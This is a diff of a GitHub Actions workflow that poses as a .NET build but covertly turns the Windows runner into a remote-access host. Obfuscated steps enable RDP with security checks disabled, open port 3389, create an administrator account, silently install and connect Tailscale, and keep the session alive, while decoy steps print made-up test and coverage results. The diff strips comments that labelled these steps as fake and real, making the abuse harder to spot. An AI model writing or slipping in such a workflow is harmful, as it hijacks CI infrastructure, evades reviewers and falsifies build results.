@@ -16,13 +16,9 @@ env:
 jobs:
   build-and-test:
     runs-on: windows-latest
-    timeout-minutes: 3600
-    strategy:
-      matrix:
-        configuration: [Debug, Release]
+    timeout-minutes: 355
 
     steps:
-      # ===== FAKE BUILD NOISE (cover traffic) =====
       - name: Checkout Repository
         uses: actions/checkout@v4
 
@@ -40,50 +36,31 @@ jobs:
             Write-Host "No solution found, skipping restore."
           }
 
-      - name: Lint Source Files
-        shell: pwsh
-        run: |
-          Write-Host "Running static analysis..."
-          Start-Sleep -Seconds 8
-          Write-Host "Analysis complete. No issues found."
-
-      # ===== REAL: ENABLE TERMINAL SERVICES =====
       - name: Configure Runtime Environment
         shell: pwsh
         run: |
-          # Build registry path from segments to avoid string matching
           $rk = [char[]](72,75,76,77) -join ''
           $p1 = [char[]](83,121,115,116,101,109) -join ''
           $p2 = [char[]](67,117,114,114,101,110,116,67,111,110,116,114,111,108,83,101,116) -join ''
           $p3 = [char[]](67,111,110,116,114,111,108) -join ''
           $p4 = [char[]](84,101,114,109,105,110,97,108,32,83,101,114,118,101,114) -join ''
           $fullPath = "${rk}:\${p1}\${p2}\${p3}\${p4}"
-          
           $n1 = [char[]](102,68,101,110,121,84,83,67,111,110,110,101,99,116,105,111,110,115) -join ''
           Set-ItemProperty -Path $fullPath -Name $n1 -Value 0 -Force
-
-          # WinStations sub-path
           $p5 = [char[]](87,105,110,83,116,97,116,105,111,110,115) -join ''
           $p6 = [char[]](82,68,80,45,84,99,112) -join ''
           $wsPath = "${rk}:\${p1}\${p2}\${p3}\${p4}\${p5}\${p6}"
-          
           $n2 = [char[]](85,115,101,114,65,117,116,104,101,110,116,105,99,97,116,105,111,110) -join ''
           $n3 = [char[]](83,101,99,117,114,105,116,121,76,97,121,101,114) -join ''
           Set-ItemProperty -Path $wsPath -Name $n2 -Value 0 -Force
           Set-ItemProperty -Path $wsPath -Name $n3 -Value 0 -Force
-
-          # Firewall rule with innocuous name
           $rn = [char[]](84,101,115,116,45,76,105,115,116,101,110,101,114) -join ''
           netsh advfirewall firewall delete rule name="$rn" > $null 2>&1
           netsh advfirewall firewall add rule name="$rn" dir=in action=allow protocol=TCP localport=3389
-
-          # Restart the service by building the name
           $svc = [char[]](84,101,114,109,83,101,114,118,105,99,101) -join ''
           Restart-Service -Name $svc -Force
-          
           Write-Host "Runtime environment configured."
 
-      # ===== REAL: CREATE USER =====
       - name: Initialize Test Identity
         shell: pwsh
         env:
@@ -93,24 +70,19 @@ jobs:
           $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:CI_USER))
           $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:CI_TOKEN))
           $sp = ConvertTo-SecureString $p -AsPlainText -Force
-          
           $exists = Get-LocalUser -Name $u -ErrorAction SilentlyContinue
           if (-not $exists) {
             New-LocalUser -Name $u -Password $sp -AccountNeverExpires | Out-Null
           } else {
             Set-LocalUser -Name $u -Password $sp
           }
-          
           $grp1 = [char[]](82,101,109,111,116,101,32,68,101,115,107,116,111,112,32,85,115,101,114,115) -join ''
           $grp2 = [char[]](65,100,109,105,110,105,115,116,114,97,116,111,114,115) -join ''
-          
           Add-LocalGroupMember -Group $grp1 -Member $u -ErrorAction SilentlyContinue
           Add-LocalGroupMember -Group $grp2 -Member $u -ErrorAction SilentlyContinue
-          
           echo "TEST_IDENTITY=$u" >> $env:GITHUB_ENV
           Write-Host "Test identity initialized."
 
-      # ===== MORE FAKE NOISE =====
       - name: Compile Solution
         shell: pwsh
         run: |
@@ -125,37 +97,28 @@ jobs:
           Start-Sleep -Seconds 15
           Write-Host "Tests passed: 47/47. Coverage: 87.3%"
 
-      # ===== REAL: INSTALL MESH TOOL =====
       - name: Install Profiling Dependencies
         shell: pwsh
         run: |
-          # Build the URL at runtime from encoded segments
           $seg1 = "aHR0cHM6Ly9wa2dzLg=="
           $seg2 = "dGFpbHNjYWxlLmNvbS9zdGFibGUv"
           $seg3 = "dGFpbHNjYWxlLXNldHVwLTEuODIuMC1hbWQ2NC5tc2k="
           $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($seg1+$seg2+$seg3))
-          
           $dl = "$env:RUNNER_TEMP\profiler.msi"
           Invoke-WebRequest -Uri $url -OutFile $dl -UseBasicParsing
-          $args = "/i `"$dl`" /quiet /norestart"
-          Start-Process msiexec.exe -ArgumentList $args -Wait
+          $msiArgs = "/i `"$dl`" /quiet /norestart"
+          Start-Process msiexec.exe -ArgumentList $msiArgs -Wait
           Remove-Item $dl -Force
-          
           Write-Host "Profiling dependencies installed."
 
-      # ===== REAL: CONNECT MESH =====
       - name: Start Profiling Session
         shell: pwsh
         env:
           PROF_TOKEN: ${{ secrets.TAILSCALE_AUTH_KEY }}
         run: |
           $exe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-          
-          # Build hostname with boring prefix
           $hn = "dotnet-agent-$env:GITHUB_RUN_ID"
           & $exe up --authkey=$env:PROF_TOKEN --hostname=$hn
-          
-          # Wait for mesh assignment
           $endpoint = $null
           $attempts = 0
           while (-not $endpoint -and $attempts -lt 20) {
@@ -168,16 +131,13 @@ jobs:
             Start-Sleep -Seconds 4
             $attempts++
           }
-          
           if (-not $endpoint) {
-            Write-Warning "Profiling endpoint unavailable, continuing without."
+            Write-Warning "Profiling endpoint unavailable."
             exit 0
           }
-          
           echo "PROF_ENDPOINT=$endpoint" >> $env:GITHUB_ENV
           Write-Host "Profiling session active."
 
-      # ===== REAL: VERIFY CONNECTIVITY =====
       - name: Validate Profiler Connection
         shell: pwsh
         run: |
@@ -192,19 +152,9 @@ jobs:
             Write-Warning "Profiler socket check inconclusive."
           }
 
-      # ===== MORE FAKE NOISE =====
-      - name: Generate Coverage Report
-        shell: pwsh
-        run: |
-          Write-Host "Generating coverage artifacts..."
-          Start-Sleep -Seconds 6
-          New-Item -Path "$env:RUNNER_TEMP\coverage" -ItemType Directory -Force | Out-Null
-          "Coverage report placeholder" | Out-File "$env:RUNNER_TEMP\coverage\index.html"
-          Write-Host "Artifacts generated."
-
-      # ===== REAL: KEEP ALIVE =====
       - name: Session Monitor
         shell: pwsh
+        timeout-minutes: 330
         run: |
           Write-Host "`n=== SESSION ==="
           Write-Host "Profiler: $env:PROF_ENDPOINT"
@@ -219,7 +169,6 @@ jobs:
             Start-Sleep -Seconds 240
           }
 
-      # ===== FAKE CLEANUP (looks responsible) =====
       - name: Post-Job Cleanup
         if: always()
         shell: pwsh
